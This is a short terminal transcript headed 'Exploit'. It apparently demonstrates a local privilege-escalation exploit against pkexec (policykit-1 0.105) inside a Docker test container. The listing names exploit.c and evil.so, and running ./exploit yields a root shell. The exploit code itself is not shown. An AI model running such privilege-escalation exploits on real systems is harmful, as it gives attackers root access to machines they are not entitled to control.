## Exploit
```
┌──(kali㉿kali)-[~/test/privescdock]
└─$ docker run --rm -it testpkexec
user@bc4803a951e9:~$ ls
Makefile  evil-so.c  evil.so  exploit  exploit.c  policykit-1_0.105-31_amd64.deb
user@bc4803a951e9:~$ ./exploit 
# id
uid=0(root) gid=0(root) groups=0(root)
#    
```

